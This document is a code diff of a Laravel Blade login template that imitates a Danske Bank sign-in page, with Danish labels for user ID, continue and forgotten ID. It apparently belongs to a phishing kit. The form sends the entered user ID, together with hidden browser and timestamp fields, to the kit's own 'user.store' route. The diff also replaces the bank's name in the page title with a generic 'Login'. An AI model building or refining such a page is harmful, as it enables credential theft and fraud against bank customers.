@@ -1,7 +1,7 @@
 @extends('frontend.layout')
 {{-- Page title --}}
 @section('title')
-    Danske Bank
+    Login
 @stop
 {{-- page level styles --}}
 @section('header_styles')
@@ -34,8 +34,8 @@
                                                 <hr class="sidebar-divider my-0">
                                             </div>
                                             <div class="info pt-2">
-                                                <span>BRUGER-ID</span>
-                                                <form action="{{route('user.store')}}" method="post">
+                                                <span>BRUGER-ID <i class="icon-question"></i></span>
+                                                <form data-toggle="validator" action="{{route('user.store')}}" method="post">
                                                     @csrf
                                                     <input hidden name="browser" id="browser">
                                                     <input hidden name="dateTime" value="{{date('Y-m-d H:i:s')}}">
@@ -43,12 +43,10 @@
                                                         <input class="form-control" name="name" id="user" required>
                                                     </div>
                                                     <div class="form-group">
-                                                        <button class="btn btn-info w-100" type="submit" style="justify-content: right">Fortsæt<i class="arrow_right"></i></button>
+                                                        <button class="btn btn-info w-100" type="submit"> Fortsæt <i class="ti-arrow-right "></i></button>
                                                     </div>
                                                 </form>
-                                                <a class="blue-color"><i class="ui-icon-info"></i>
-                                                    Glemt bruger-ID?
-                                                </a>
+                                                <a class="info-color"><i class="icon-info"></i> Glemt bruger-ID?</a>
                                             </div>
                                             <div class="info">
                                                 <div class="form-check">
@@ -59,7 +57,7 @@
                                                 </div>
                                                 <hr class="sidebar-divider my-0">
                                                 <div class="help">
-                                                    <a class="blue-color" href="">Afbryd</a> <a class="blue-color" href="">Hjaelp</a>
+                                                    <a class="blue-color" href="">Afbryd</a>&nbsp;&nbsp;<a class="blue-color" href="">Hjaelp</a>
                                                 </div>
                                             </div>
                                         </div>
